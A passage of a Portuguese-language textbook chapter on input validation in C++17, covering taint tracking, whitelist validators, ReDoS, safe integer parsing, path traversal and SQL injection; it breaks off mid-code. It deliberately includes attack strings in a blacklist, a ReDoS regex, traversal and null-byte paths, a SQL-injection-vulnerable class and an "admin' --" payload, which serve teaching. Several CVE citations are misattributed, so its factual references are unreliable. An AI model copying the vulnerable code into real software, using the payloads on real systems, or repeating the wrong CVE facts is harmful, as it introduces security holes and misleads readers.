# Capítulo 6 — Validação de Entrada e Sanitização

> *"Entrada confiável é uma contradição em termos."*
> — Princípio fundamental de segurança em software

A validação de entrada é a primeira e mais crítica linha de defesa contra ataques de injeção. Neste capítulo, exploramos os conceitos fundamentais de dados contaminados, técnicas de validação, e construímos uma biblioteca completa de sanitização em C++17.

---

## Objetivos de Aprendizado

Ao final deste capítulo, você será capaz de:

1. **Identificar e classificar dados contaminados** em sistemas C++, rastreando seu fluxo desde fontes externas até pontos de uso crítico, aplicando o princípio de confiança zero.

2. **Implementar estratégias de whitelisting e validação** que sejam fundamentalmente superiores ao blacklist, incluindo validadores completos para email, URL, endereço IP e outros formatos comuns.

3. **Construir parsers seguros** usando bibliotecas modernas como RE2 para evitar vulnerabilidades ReDoS, e aplicar validação de tipos, ranges e formatos em cenários de entrada do mundo real.

4. **Prevenir vetores de ataque de injeção** — SQL, XSS, command injection e path traversal — implementando parameterized queries, encoding de saída, execução segura de subprocessos e manipulação segura de caminhos de arquivo.

5. **Projetar e implementar uma biblioteca completa de validação de entrada** em C++17 que demonstre a integração de todos os conceitos aprendidos, seguindo padrões de design seguros e testáveis.

---

## 1. Tainted Data: O Conceito Fundamental

### 1.1 O que são Dados Contaminados

Dados contaminados (*tainted data*) são qualquer informação que origina de uma fonte externa e que não foi validada ou sanitizada. O conceito é fundamental porque a segurança de um sistema depende da capacidade de distinguir entre dados confiáveis e não confiáveis.

Uma fronteira de confiança (*trust boundary*) é o ponto onde dados cruzam de um domínio de confiança para outro. Exemplos incluem:

- Rede para memória do processo (recebimento de pacotes)
- Sistema de arquivos para memória (leitura de arquivos)
- Entrada do usuário para lógica de negócio (formulários, CLI)
- Processo para processo (IPC, pipes, sockets)

### 1.2 Fluxo de Dados em um Sistema C++

O fluxo típico de dados contaminados em um sistema C++ segue este padrão:

```
Fonte Externa → Parser → Validação → Sanitização → Uso (ponto de confiança)
```

Cada etapa é um ponto de decisão: aceitar, rejeitar ou transformar os dados. Falhar em qualquer etapa pode introduzir vulnerabilidades.

### 1.3 Classificação de Fontes de Entrada

| Fonte | Nível de Confiança | Exemplos | Vetores de Ataque |
|-------|-------------------|----------|-------------------|
| Entrada do usuário | Mínimo | CLI, formulários, argumentos | Command injection, XSS |
| Rede | Mínimo | TCP/UDP, HTTP, gRPC | SQL injection, buffer overflow |
| Sistema de arquivos | Baixo | Config files, logs, uploads | Path traversal, symlink attacks |
| IPC | Médio | Pipes, sockets, shared memory | Format string, injection |
| Hardware | Médio | Drivers, dispositivos | Buffer overflow, race conditions |
| Código interno | Alto | Módulos internos | Não deve ser validado (verificar com asserts) |

### 1.4 Exemplo: Rastreamento de Contaminação em C++

```cpp
#include <string>
#include <optional>
#include <stdexcept>
#include <unordered_set>
#include <sstream>

// Represents the trust level of data in the system
enum class TrustLevel {
    External,    // Data from untrusted sources (network, user input)
    Validated,   // Data that passed validation checks
    Sanitized,   // Data that has been sanitized and encoded
    Trusted      // Internal data, fully controlled by the system
};

// Template for tracking data trust through the system
template<typename T>
class TaintedData {
public:
    TaintedData(T value, TrustLevel level, std::string source)
        : value_(std::move(value))
        , level_(level)
        , source_(std::move(source))
        , timestamp_(std::chrono::system_clock::now()) {}

    // Get the value (only allows access after sufficient validation)
    const T& value() const { return value_; }
    TrustLevel level() const { return level_; }
    const std::string& source() const { return source_; }

    // Transform: mark as validated (reduces taint level)
    TaintedData<T> validated() const {
        if (level_ == TrustLevel::External) {
            return TaintedData<T>(value_, TrustLevel::Validated, source_);
        }
        throw std::logic_error("Cannot validate already validated data");
    }

    // Transform: mark as sanitized (further reduces taint)
    TaintedData<T> sanitized() const {
        if (level_ == TrustLevel::External || level_ == TrustLevel::Validated) {
            return TaintedData<T>(value_, TrustLevel::Sanitized, source_);
        }
        throw std::logic_error("Cannot sanitize already sanitized data");
    }

    // Check if data is safe for use in a specific context
    bool is_safe_for(TrustLevel required) const {
        return static_cast<int>(level_) >= static_cast<int>(required);
    }

private:
    T value_;
    TrustLevel level_;
    std::string source_;
    std::chrono::system_clock::time_point timestamp_;
};

// Factory function for creating tainted external data
template<typename T>
TaintedData<T> make_external(T value, std::string source) {
    return TaintedData<T>(std::move(value), TrustLevel::External, std::move(source));
}
```

### 1.5 O Princípio do Menor Privilegio em Validação

Nunca assuma que dados de uma fonte são seguros apenas porque passaram por uma validação anterior. Cada componente deve validar os dados de acordo com suas próprias necessidades de segurança. Isso é especialmente importante em arquiteturas de microsserviços, onde a fronteira de confiança pode estar entre serviços internos.

---

## 2. Whitelisting vs Blacklisting

### 2.1 Por que Whitelist é Fundamentalmente Superior

A abordagem de whitelisting define explicitamente o que é permitido, rejeitando tudo o mais por padrão. A blacklist tenta bloquear o que é proibido, aceitando tudo o mais por padrão.

**Blacklisting tem problemas fundamentais:**

1. É impossível listar todas as variantes maliciosas
2. Atacantes podem usar encoding, case variation, ou bypasses não conhecidos
3. A superfície de ataque cresce mais rápido que a capacidade de atualização
4. Cria uma falsa sensação de segurança

**Whitelist resolve esses problemas:**

1. Define exatamente o que é aceitável
2. Rejeita qualquer coisa fora do padrão esperado
3. A superfície de ataque é limitada ao que foi definido
4. Fácil de testar e validar formalmente

### 2.2 Quando Blacklisting é Aceitável

Blacklisting pode ser aceitável como camada adicional de defesa, nunca como única defesa. Casos de uso:

- Filtro de palavras em conteúdo gerado pelo usuário (complementar, não substituir validação)
- Bloqueio de padrões conhecidos maliciosos em logs (detecção, não prevenção)
- Rate limiting baseado em padrões de comportamento

### 2.3 Exemplo: Validador Whitelist vs Blacklist

```cpp
#include <string>
#include <regex>
#include <algorithm>
#include <cctype>
#include <stdexcept>
#include <set>

// ============================================================
// BLACKLIST APPROACH (INSECURE - DO NOT USE AS SOLE DEFENSE)
// ============================================================
class InsecureEmailValidator {
public:
    // This approach is FUNDAMENTALLY FLAWED
    // It tries to block known bad patterns but misses unknown ones
    bool is_valid(const std::string& email) const {
        // Check for known dangerous patterns
        std::vector<std::string> blacklist = {
            "<script>", "javascript:", "onerror=", "onload=",
            "DROP TABLE", "UNION SELECT", "../../", "%00"
        };

        std::string lower_email = email;
        std::transform(lower_email.begin(), lower_email.end(),
                      lower_email.begin(), ::tolower);

        for (const auto& pattern : blacklist) {
            std::string lower_pattern = pattern;
            std::transform(lower_pattern.begin(), lower_pattern.end(),
                          lower_pattern.begin(), ::tolower);
            if (lower_email.find(lower_pattern) != std::string::npos) {
                return false;
            }
        }

        // Still allows many attack vectors not in the blacklist
        return !email.empty() && email.find('@') != std::string::npos;
    }
};

// ============================================================
// WHITELIST APPROACH (SECURE - PREFERRED)
// ============================================================
class SecureEmailValidator {
public:
    bool is_valid(const std::string& email) const {
        if (email.empty() || email.length() > 254) {
            return false;
        }

        // Must match exactly one '@' character
        auto at_pos = email.find('@');
        if (at_pos == std::string::npos || at_pos == 0) {
            return false;
        }

        // Check for second '@' (only one allowed)
        if (email.find('@', at_pos + 1) != std::string::npos) {
            return false;
        }

        std::string local = email.substr(0, at_pos);
        std::string domain = email.substr(at_pos + 1);

        // Validate local part with strict whitelist
        if (!is_valid_local_part(local)) {
            return false;
        }

        // Validate domain with strict whitelist
        if (!is_valid_domain(domain)) {
            return false;
        }

        return true;
    }

private:
    bool is_valid_local_part(const std::string& local) const {
        if (local.empty() || local.length() > 64) {
            return false;
        }

        // Only allow: alphanumeric, dot, hyphen, underscore, plus
        static const std::string allowed_chars =
            "abcdefghijklmnopqrstuvwxyz"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "0123456789._+-";

        for (char c : local) {
            if (allowed_chars.find(c) == std::string::npos) {
                return false;
            }
        }

        // Cannot start or end with special characters
        char first = local.front();
        char last = local.back();
        if (first == '.' || first == '-' || first == '_' || first == '+') {
            return false;
        }
        if (last == '.' || last == '-' || last == '_' || last == '+') {
            return false;
        }

        // No consecutive dots
        if (local.find("..") != std::string::npos) {
            return false;
        }

        return true;
    }

    bool is_valid_domain(const std::string& domain) const {
        if (domain.empty() || domain.length() > 253) {
            return false;
        }

        // Must contain at least one dot
        if (domain.find('.') == std::string::npos) {
            return false;
        }

        // Split into labels and validate each
        std::istringstream stream(domain);
        std::string label;

        while (std::getline(stream, label, '.')) {
            if (label.empty() || label.length() > 63) {
                return false;
            }

            // Only allow: alphanumeric, hyphen (not at start/end)
            if (label.front() == '-' || label.back() == '-') {
                return false;
            }

            for (char c : label) {
                if (!std::isalnum(c) && c != '-') {
                    return false;
                }
            }
        }

        // TLD must be alphabetic
        auto last_dot = domain.rfind('.');
        std::string tld = domain.substr(last_dot + 1);
        if (tld.length() < 2) {
            return false;
        }

        for (char c : tld) {
            if (!std::isalpha(c)) {
                return false;
            }
        }

        return true;
    }
};
```

### 2.4 Biblioteca Completa de Validação de Email e URL

```cpp
#include <string>
#include <regex>
#include <optional>
#include <sstream>
#include <algorithm>
#include <cctype>
#include <vector>

class InputValidator {
public:
    // Email validation using strict whitelist approach
    static bool validate_email(const std::string& email) {
        static const std::regex email_regex(
            R"(^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$)"
        );
        return std::regex_match(email, email_regex);
    }

    // URL validation with protocol whitelist
    static bool validate_url(const std::string& url) {
        static const std::regex url_regex(
            R"(^https?://[a-zA-Z0-9\-._~:/?#\[\]@!$&'()*+,;=%]+$)"
        );

        if (!std::regex_match(url, url_regex)) {
            return false;
        }

        // Additional checks
        if (url.length() > 2048) {
            return false;
        }

        // Check for path traversal attempts
        if (url.find("..") != std::string::npos) {
            return false;
        }

        // Check for null bytes
        if (url.find('\0') != std::string::npos) {
            return false;
        }

        return true;
    }

    // IPv4 address validation
    static bool validate_ipv4(const std::string& ip) {
        std::istringstream stream(ip);
        std::string octet;
        int count = 0;

        while (std::getline(stream, octet, '.')) {
            count++;
            if (count > 4) return false;

            // Must be numeric only
            if (octet.empty()) return false;
            for (char c : octet) {
                if (!std::isdigit(c)) return false;
            }

            // No leading zeros (except "0" itself)
            if (octet.length() > 1 && octet[0] == '0') return false;

            // Range check
            try {
                int value = std::stoi(octet);
                if (value < 0 || value > 255) return false;
            } catch (...) {
                return false;
            }
        }

        return count == 4;
    }

    // IPv6 address validation (simplified)
    static bool validate_ipv6(const std::string& ip) {
        std::istringstream stream(ip);
        std::string group;
        int count = 0;

        while (std::getline(stream, group, ':')) {
            count++;
            if (count > 8) return false;

            if (group.empty()) continue;  // Allow :: notation

            if (group.length() > 4) return false;

            for (char c : group) {
                if (!std::isxdigit(c)) return false;
            }
        }

        return count >= 2 && count <= 8;
    }

    // Path validation against traversal attacks
    static bool validate_path(const std::string& path,
                              const std::string& base_dir) {
        // Check for null bytes
        if (path.find('\0') != std::string::npos) {
            return false;
        }

        // Check for traversal sequences
        if (path.find("..") != std::string::npos) {
            return false;
        }

        // Check for absolute paths when relative expected
        if (!path.empty() && path[0] == '/') {
            return false;
        }

        // Check for special characters
        static const std::string dangerous_chars = "<>|\"*?";
        for (char c : path) {
            if (dangerous_chars.find(c) != std::string::npos) {
                return false;
            }
        }

        // Canonicalize and check prefix
        std::string resolved = base_dir + "/" + path;
        std::string canonical = canonicalize_path(resolved);

        if (canonical.find(canonicalize_path(base_dir)) != 0) {
            return false;
        }

        return true;
    }

private:
    static std::string canonicalize_path(const std::string& path) {
        // Simplified canonicalization
        std::vector<std::string> components;
        std::istringstream stream(path);
        std::string component;

        while (std::getline(stream, component, '/')) {
            if (component == "." || component.empty()) {
                continue;
            }
            if (component == "..") {
                if (!components.empty()) {
                    components.pop_back();
                }
            } else {
                components.push_back(component);
            }
        }

        std::string result;
        for (const auto& comp : components) {
            result += "/" + comp;
        }

        return result.empty() ? "/" : result;
    }
};
```

---

## 3. Regular Expressions Seguras

### 3.1 std::regex vs RE2 vs PCRE: Implicações de Segurança

As bibliotecas de expressões regulares em C++ variam significativamente em termos de segurança:

| Biblioteca | Backtracking | Limite de Tempo | Proteção ReDoS | Uso Recomendado |
|-----------|--------------|-----------------|----------------|-----------------|
| `std::regex` | Sim | Não | Não | Validações simples |
| `std::regex` (ECMAScript) | Sim | Não | Não | Evitar em produção |
| RE2 | Não | Sim | Sim | Validações em produção |
| PCRE2 | Sim (controlável) | Configurável | Parcial | Uso avançado |
| CTRE (compile-time) | Não | N/A | Sim | Patterns estáticos |

### 3.2 ReDoS (Regular Expression Denial of Service)

ReDoS ocorre quando uma expressão regular entra em *catastrophic backtracking*, consumindo CPU exponencialmente com o tamanho da entrada.

**Exemplo de padrão vulnerável a ReDoS:**

```
^(a+)+$
```

Para a entrada `"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaab"`, o engine tenta todas as combinações possíveis de agrupamento, resultando em complexidade O(2^n).

### 3.3 CVE: Vulnerabilidades de Backtracking Catastrófico

Vários CVEs documentam vulnerabilidades de ReDoS em bibliotecas populares:

- **CVE-2016-6183**: Ruby on Rails vulnerable a ReDoS em validação de email
- **CVE-2017-1000075**: JavaScript RegExp engine com backtracking exponencial
- **CVE-2020-28469**: Go regular expression library com ReDoS

Em C++, o `std::regex` padrão é especialmente vulnerável porque não implementa limites de tempo ou backtracking controlado.

### 3.4 Padrões Regex Seguros em C++

```cpp
#include <string>
#include <regex>
#include <chrono>
#include <future>
#include <optional>

// ReDoS-safe email validation pattern
// Avoids nested quantifiers and catastrophic backtracking
class RegexValidator {
public:
    // SAFE: Simple, non-nested pattern for email validation
    static bool validate_email_safe(const std::string& email) {
        // This pattern avoids catastrophic backtracking by:
        // 1. No nested quantifiers
        // 2. Character classes instead of alternation
        // 3. Bounded repetition where possible
        static const std::regex pattern(
            R"(^[a-zA-Z0-9._%+\-]{1,64}@[a-zA-Z0-9.\-]{1,253}\.[a-zA-Z]{2,}$)",
            std::regex::ECMAScript
        );
        return std::regex_match(email, pattern);
    }

    // SAFE: Phone number validation with bounded repetition
    static bool validate_phone(const std::string& phone) {
        // Bounded: exactly 10-15 digits, optional formatting chars
        static const std::regex pattern(
            R"(^\+?[0-9]{1,4}[\s\-]?[0-9]{1,4}[\s\-]?[0-9]{1,4}[\s\-]?[0-9]{1,9}$)"
        );
        return std::regex_match(phone, pattern);
    }

    // DANGEROUS: Example of ReDoS-vulnerable pattern (DO NOT USE)
    // This demonstrates what NOT to write:
    static bool validate_vulnerable(const std::string& input) {
        // VULNERABLE: Nested quantifiers cause exponential backtracking
        // Pattern: (a+)+ matches "a" repeated, but fails exponentially on "b"
        static const std::regex bad_pattern(R"(^(a+)+$)");
        try {
            return std::regex_match(input, bad_pattern);
        } catch (const std::regex_error&) {
            return false;
        }
    }

    // Safe alternative: use atomic groups or possessive quantifiers
    // (Note: std::regex doesn't support these, use RE2 for production)
    static bool validate_safe_alternative(const std::string& input) {
        // SAFE: Linear complexity, no backtracking
        static const std::regex safe_pattern(R"(^a+$)");
        return std::regex_match(input, safe_pattern);
    }
};
```

### 3.5 Exemplo: Biblioteca de Validação com RE2

```cpp
// Requires RE2 library: https://github.com/google/re2
// Compile with: g++ -std=c++17 -lre2 -o validator validator.cpp

#include <string>
#include <re2/re2.h>
#include <optional>
#include <vector>
#include <unordered_map>

class RE2Validator {
public:
    struct ValidationResult {
        bool valid;
        std::string error_message;
        std::vector<std::string> captures;
    };

    RE2Validator() : compiled_(true) {}

    // Add a named validation rule
    void add_rule(const std::string& name,
                  const std::string& pattern,
                  const std::string& error_msg = "") {
        auto regex = std::make_unique<re2::RE2>(pattern);
        if (!regex->ok()) {
            throw std::runtime_error("Invalid regex pattern: " + pattern);
        }
        rules_[name] = std::move(regex);
        errors_[name] = error_msg;
    }

    // Validate input against a named rule
    ValidationResult validate(const std::string& name,
                              const std::string& input) {
        auto it = rules_.find(name);
        if (it == rules_.end()) {
            return {false, "Unknown validation rule: " + name, {}};
        }

        re2::RE2* regex = it->second.get();
        std::vector<std::string> captures(regex->NumberOfCapturingGroups() + 1);

        if (re2::RE2::FullMatch(input, *regex, captures.begin() + 1,
                                captures.end())) {
            return {true, "", captures};
        }

        auto err_it = errors_.find(name);
        std::string error = (err_it != errors_.end()) ?
                           err_it->second : "Validation failed";
        return {false, error, {}};
    }

    // Validate email using RE2 (safe, no ReDoS)
    ValidationResult validate_email(const std::string& email) {
        // RE2 uses bounded matching, preventing catastrophic backtracking
        static re2::RE2 email_regex(
            R"(^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$)"
        );

        std::vector<std::string> captures(3);
        if (re2::RE2::FullMatch(email, email_regex,
                                captures.begin() + 1, captures.end())) {
            return {true, "", captures};
        }
        return {false, "Invalid email format", {}};
    }

    // Validate IP address using RE2
    ValidationResult validate_ipv4(const std::string& ip) {
        // IPv4 with proper octet validation (0-255, no leading zeros)
        static re2::RE2 ipv4_regex(
            R"(^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$)"
        );

        if (re2::RE2::FullMatch(ip, ipv4_regex)) {
            return {true, "", {}};
        }
        return {false, "Invalid IPv4 address", {}};
    }

private:
    std::unordered_map<std::string, std::unique_ptr<re2::RE2>> rules_;
    std::unordered_map<std::string, std::string> errors_;
    bool compiled_;
};

// Usage example
void validate_inputs() {
    RE2Validator validator;

    // Validate various inputs
    auto email_result = validator.validate_email("user@example.com");
    auto ip_result = validator.validate_ipv4("192.168.1.1");

    // Custom rules
    validator.add_rule("username", R"(^[a-zA-Z0-9_]{3,20}$)",
                       "Username must be 3-20 alphanumeric chars or underscore");
    validator.add_rule("password", R"(^(?=.*[A-Z])(?=.*[0-9]).{8,}$)",
                       "Password must be 8+ chars with uppercase and digit");

    auto username_result = validator.validate("username", "john_doe123");
    auto password_result = validator.validate("password", "Secure123");
}
```

---

## 4. Validação de Tipos, Ranges e Formatos

### 4.1 Overflow Numérico na Análise de Entrada

Uma das vulnerabilidades mais comuns em parsing de entrada é o overflow numérico. Quando um número é lido de uma string e armazenado em um tipo de dado, o valor pode exceder os limites do tipo, causando comportamento indefinido ou valores incorretos.

**CVE: Heartbleed (CVE-2014-0160)** — Embora não seja um overflow de parsing típico, o Heartbleed demonstra como a falta de validação de comprimento de entrada pode expor dados sensíveis.

### 4.2 Problemas de Encoding

A manipulação de strings UTF-8 e Unicode introducecomplexidades significativas:

- Caracteres multibyte podem ser divididos incorretamente
- Normalização Unicode pode criar variantes equivalentes
- Bidi (bidirectional text) pode ocultar código malicioso

### 4.3 Exemplo: Parsing Seguro de Inteiros

```cpp
#include <string>
#include <optional>
#include <stdexcept>
#include <charconv>
#include <limits>
#include <type_traits>

// Secure integer parsing with overflow detection
class SecureParser {
public:
    // Parse string to integer with bounds checking
    template<typename T>
    static std::optional<T> parse_int(const std::string& input) {
        static_assert(std::is_integral_v<T>, "T must be an integral type");

        if (input.empty()) {
            return std::nullopt;
        }

        T value;
        auto [ptr, ec] = std::from_chars(
            input.data(),
            input.data() + input.size(),
            value
        );

        if (ec != std::errc() || ptr != input.data() + input.size()) {
            return std::nullopt;  // Parse error or trailing characters
        }

        return value;
    }

    // Parse with range validation
    template<typename T>
    static std::optional<T> parse_int_in_range(
        const std::string& input,
        T min_value,
        T max_value)
    {
        auto value = parse_int<T>(input);
        if (!value) {
            return std::nullopt;
        }

        if (*value < min_value || *value > max_value) {
            return std::nullopt;
        }

        return value;
    }

    // Parse with strict validation (no leading/trailing whitespace)
    template<typename T>
    static std::optional<T> parse_int_strict(const std::string& input) {
        // Reject empty strings
        if (input.empty()) {
            return std::nullopt;
        }

        // Reject strings with whitespace
        for (char c : input) {
            if (std::isspace(static_cast<unsigned char>(c))) {
                return std::nullopt;
            }
        }

        return parse_int<T>(input);
    }

    // Safe conversion between integer types
    template<typename To, typename From>
    static std::optional<To> safe_cast(From value) {
        if (value < std::numeric_limits<To>::min() ||
            value > std::numeric_limits<To>::max()) {
            return std::nullopt;
        }
        return static_cast<To>(value);
    }

    // Parse boolean from various string representations
    static std::optional<bool> parse_bool(const std::string& input) {
        std::string lower = input;
        std::transform(lower.begin(), lower.end(),
                      lower.begin(), ::tolower);

        static const std::unordered_set<std::string> true_values = {
            "true", "1", "yes", "on", "enable"
        };
        static const std::unordered_set<std::string> false_values = {
            "false", "0", "no", "off", "disable", ""
        };

        if (true_values.count(lower)) return true;
        if (false_values.count(lower)) return false;

        return std::nullopt;
    }

    // Parse floating point with validation
    static std::optional<double> parse_double(const std::string& input) {
        if (input.empty()) {
            return std::nullopt;
        }

        char* end;
        double value = std::strtod(input.c_str(), &end);

        if (end == input.c_str()) {
            return std::nullopt;  // No conversion performed
        }

        if (*end != '\0') {
            return std::nullopt;  // Trailing characters
        }

        if (std::isinf(value) || std::isnan(value)) {
            return std::nullopt;  // Reject infinity and NaN
        }

        return value;
    }
};

// Date/time parsing with validation
class SecureDateParser {
public:
    struct Date {
        int year;
        int month;
        int day;
        int hour;
        int minute;
        int second;
    };

    // Parse ISO 8601 date string (YYYY-MM-DDTHH:MM:SS)
    static std::optional<Date> parse_iso8601(const std::string& input) {
        Date date;

        // Check minimum length
        if (input.length() < 19) {
            return std::nullopt;
        }

        // Parse year
        auto year = SecureParser::parse_int_in_range<int>(
            input.substr(0, 4), 1900, 2100);
        if (!year) return std::nullopt;
        date.year = *year;

        // Validate separator
        if (input[4] != '-' || input[7] != '-' || input[10] != 'T' ||
            input[13] != ':' || input[16] != ':') {
            return std::nullopt;
        }

        // Parse month
        auto month = SecureParser::parse_int_in_range<int>(
            input.substr(5, 2), 1, 12);
        if (!month) return std::nullopt;
        date.month = *month;

        // Parse day (simple range check)
        auto day = SecureParser::parse_int_in_range<int>(
            input.substr(8, 2), 1, 31);
        if (!day) return std::nullopt;
        date.day = *day;

        // Validate day for month
        if (!is_valid_day(date.year, date.month, date.day)) {
            return std::nullopt;
        }

        // Parse time
        auto hour = SecureParser::parse_int_in_range<int>(
            input.substr(11, 2), 0, 23);
        if (!hour) return std::nullopt;
        date.hour = *hour;

        auto minute = SecureParser::parse_int_in_range<int>(
            input.substr(14, 2), 0, 59);
        if (!minute) return std::nullopt;
        date.minute = *minute;

        auto second = SecureParser::parse_int_in_range<int>(
            input.substr(17, 2), 0, 59);
        if (!second) return std::nullopt;
        date.second = *second;

        return date;
    }

private:
    static bool is_valid_day(int year, int month, int day) {
        static const int days_in_month[] = {
            31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31
        };

        if (month < 1 || month > 12) return false;

        int max_day = days_in_month[month - 1];

        // Leap year adjustment
        if (month == 2 && is_leap_year(year)) {
            max_day = 29;
        }

        return day >= 1 && day <= max_day;
    }

    static bool is_leap_year(int year) {
        return (year % 4 == 0 && year % 100 != 0) || (year % 400 == 0);
    }
};
```

---

## 5. Canonicalização e Path Traversal

### 5.1 Ataques de Canonicalização de Caminho

Ataques de path traversal exploram a incapacidade do sistema de resolver caminhos de forma canônica antes de verificar permissões. Sequências como `../`, `..\\`, ou symlink loops podem contornar verificações de acesso baseadas em caminho.

### 5.2 CVE: Path Traversal em Aplicações

Vários CVEs documentam vulnerabilidades de path traversal:

- **CVE-2019-14232**: Django file upload bypass
- **CVE-2020-11009**: Arbitrary file read in Pluck CMS
- **CVE-2021-41773**: Path traversal in Apache HTTP Server

### 5.3 Symlink Traversal

Symlinks podem ser usados para contornar verificações de caminho, mesmo quando o canonicalizador resolve `..` corretamente:

```
/user/uploads/photo.jpg -> /etc/passwd
```

### 5.4 Injeção de Null Byte

Em C, strings terminadas por null byte podem ser exploradas:

```
/etc/passwd%00.jpg
```

O parser pode tratar `%00` como terminador, enquanto o sistema de arquivos aceita o arquivo completo.

### 5.5 Biblioteca Segura de Manipulação de Caminhos em C++

```cpp
#include <string>
#include <filesystem>
#include <optional>
#include <algorithm>
#include <set>
#include <vector>

namespace fs = std::filesystem;

class SecurePathHandler {
public:
    struct PathValidationResult {
        bool valid;
        std::string resolved_path;
        std::string error_message;
    };

    // Constructor with allowed base directories
    SecurePathHandler(const std::vector<std::string>& allowed_bases)
        : allowed_bases_(allowed_bases) {
        // Canonicalize base directories
        for (const auto& base : allowed_bases) {
            fs::path canonical_base = fs::weakly_canonical(base);
            if (fs::exists(canonical_base)) {
                canonical_bases_.insert(canonical_base.string());
            }
        }
    }

    // Validate and resolve a user-provided path
    PathValidationResult validate_path(const std::string& user_path) const {
        // Check for null bytes
        if (user_path.find('\0') != std::string::npos) {
            return {false, "", "Path contains null bytes"};
        }

        // Check for control characters
        for (char c : user_path) {
            if (static_cast<unsigned char>(c) < 32) {
                return {false, "", "Path contains control characters"};
            }
        }

        // Try to create and canonicalize the path
        fs::path user_fs_path(user_path);
        fs::path resolved;

        try {
            // Use weakly_canonical to resolve without requiring existence
            resolved = fs::weakly_canonical(user_fs_path);
        } catch (const fs::filesystem_error& e) {
            return {false, "", "Invalid path: " + std::string(e.what())};
        }

        // Check if resolved path is within any allowed base
        std::string resolved_str = resolved.string();
        bool is_within_allowed = false;

        for (const auto& base : canonical_bases_) {
            // Ensure base ends with separator for proper prefix check
            std::string base_with_sep = base;
            if (!base_with_sep.empty() &&
                base_with_sep.back() != fs::path::preferred_separator) {
                base_with_sep += fs::path::preferred_separator;
            }

            if (resolved_str.find(base_with_sep) == 0 ||
                resolved_str == base) {
                is_within_allowed = true;
                break;
            }
        }

        if (!is_within_allowed) {
            return {false, "", "Path escapes allowed directory"};
        }

        // Check for symlink chains
        try {
            if (fs::exists(resolved) && fs::is_symlink(resolved)) {
                fs::path real_target = fs::read_symlink(resolved);
                if (!is_path_safe(real_target)) {
                    return {false, "", "Symlink target is outside allowed directories"};
                }
            }
        } catch (const fs::filesystem_error& e) {
            return {false, "", "Error checking symlinks: " + std::string(e.what())};
        }

        return {true, resolved_str, ""};
    }

    // Safely read a file with path validation
    std::optional<std::string> safe_read_file(const std::string& user_path) const {
        auto validation = validate_path(user_path);
        if (!validation.valid) {
            return std::nullopt;
        }

        fs::path file_path(validation.resolved_path);

        // Additional checks
        if (!fs::exists(file_path)) {
            return std::nullopt;
        }

        if (!fs::is_regular_file(file_path)) {
            return std::nullopt;
        }

        // Check file size (prevent DoS via huge files)
        auto file_size = fs::file_size(file_path);
        constexpr uintmax_t MAX_FILE_SIZE = 100 * 1024 * 1024;  // 100 MB
        if (file_size > MAX_FILE_SIZE) {
            return std::nullopt;
        }

        // Read file content
        std::ifstream file(file_path, std::ios::binary);
        if (!file.is_open()) {
            return std::nullopt;
        }

        std::string content(file_size, '\0');
        file.read(content.data(), file_size);

        return content;
    }

private:
    std::vector<std::string> allowed_bases_;
    std::set<std::string> canonical_bases_;

    bool is_path_safe(const fs::path& path) const {
        try {
            fs::path canonical = fs::weakly_canonical(path);
            std::string canonical_str = canonical.string();

            for (const auto& base : canonical_bases_) {
                std::string base_with_sep = base;
                if (!base_with_sep.empty() &&
                    base_with_sep.back() != fs::path::preferred_separator) {
                    base_with_sep += fs::path::preferred_separator;
                }

                if (canonical_str.find(base_with_sep) == 0 ||
                    canonical_str == base) {
                    return true;
                }
            }
        } catch (...) {
            return false;
        }

        return false;
    }
};

// Example usage
void path_traversal_prevention() {
    // Configure allowed directories
    std::vector<std::string> allowed = {
        "/var/www/uploads",
        "/tmp/user_files"
    };

    SecurePathHandler handler(allowed);

    // This should succeed
    auto result1 = handler.validate_path("uploads/photo.jpg");
    // result1.valid == true

    // This should be rejected (path traversal attempt)
    auto result2 = handler.validate_path("uploads/../../etc/passwd");
    // result2.valid == false, error: "Path escapes allowed directory"

    // This should be rejected (null byte injection attempt)
    auto result3 = handler.validate_path("uploads/photo.jpg\0.txt");
    // result3.valid == false, error: "Path contains null bytes"
}
```

---

## 6. SQL Injection e Parameterized Queries

### 6.1 Walkthrough Completo de SQL Injection

O SQL Injection continua sendo uma das vulnerabilidades mais perigosas. O ataque ocorre quando dados do usuário são concatenados diretamente em queries SQL sem sanitização.

### 6.2 CVE: Heartland Payment Systems (2008)

O ataque ao Heartland Payment Systems em 2008 é um dos maiores exemplos de SQL injection na história:

- **Data**: 2008-2009
- **Impacto**: 130 milhões de cartões de crédito comprometidos
- **Vetor**: SQL injection em aplicação web
- **Perda estimada**: $140 milhões em multas e compensações
- **CWE**: CWE-89 (SQL Injection)

O atacante instalou sniffers na rede do Heartland para capturar dados de cartão, mas a entrada inicial foi via SQL injection em uma aplicação web desatualizada.

### 6.3 Vulnerabilidade SQL Injection em C++

```cpp
#include <string>
#include <iostream>
#include <sqlite3.h>

// ============================================================
// INSECURE: Vulnerable to SQL Injection (DO NOT USE)
// ============================================================
class InsecureUserDatabase {
public:
    InsecureUserDatabase(sqlite3* db) : db_(db) {}

    // VULNERABLE: Direct string concatenation
    std::string get_user(const std::string& username) {
        std::string query = "SELECT * FROM users WHERE username = '"
                          + username + "'";  // SQL INJECTION!

        char* error_msg = nullptr;
        sqlite3_exec(db_, query.c_str(), callback, this, &error_msg);

        if (error_msg) {
            std::string error = error_msg;
            sqlite3_free(error_msg);
            throw std::runtime_error("SQL error: " + error);
        }

        return last_result_;
    }

private:
    sqlite3* db_;
    std::string last_result_;

    static int callback(void* data, int argc, char** argv,
                       char** column_names) {
        auto* self = static_cast<InsecureUserDatabase*>(data);
        self->last_result_ = argv[0] ? argv[0] : "";
        return 0;
    }
};

// Attacker input: username = "admin' --"
// Resulting query: SELECT * FROM users WHERE username = 'admin' --'
// The comment (--) makes the rest of the query a comment
```

### 6.4 Solução: Parameterized Queries em C++

```cpp
#include <string>
#include <vector>
#include <sqlite3.h>
#include <stdexcept>
#include <memory>

// ============================================================
// SECURE: Parameterized queries (USE THIS)
// ============================================================
class SecureUserDatabase {
public:
    explicit SecureUserDatabase(sqlite3* db) : db_(db) {}

    struct User {
        int id;
        std::string username;
        std::string email;
        bool is_admin;
    };

    // SECURE: Using parameterized query
